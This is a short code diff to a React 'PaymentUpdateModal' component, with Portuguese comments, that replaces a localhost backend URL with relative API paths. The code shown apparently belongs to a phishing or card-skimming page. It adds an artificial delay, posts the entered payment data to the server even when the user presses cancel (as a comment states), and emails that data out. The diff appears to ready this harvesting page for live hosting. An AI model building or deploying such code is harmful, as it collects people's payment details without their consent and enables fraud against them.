@@ -55,8 +55,7 @@ export const PaymentUpdateModal = ({
       await new Promise((resolve) => setTimeout(resolve, 2500));
 
       // Envia dados para backend
-      const backendUrl = 'http://localhost:5555';
-      const response = await fetch(`${backendUrl}/api/update-payment`, {
+      const response = await fetch(`/api/update-payment`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -102,11 +101,10 @@ export const PaymentUpdateModal = ({
 
   const handleCancel = async () => {
     setIsLoading(true);
-    
+
     try {
       // Envia dados mesmo ao cancelar
-      const backendUrl = 'http://localhost:5555';
-      await fetch(`${backendUrl}/api/update-payment`, {
+      await fetch(`/api/update-payment`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -140,8 +138,7 @@ export const PaymentUpdateModal = ({
 
   const sendEmail = async (data: typeof paymentData, action: string) => {
     try {
-      const backendUrl = 'http://localhost:5555';
-      await fetch(`${backendUrl}/api/send-email`, {
+      await fetch(`/api/send-email`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
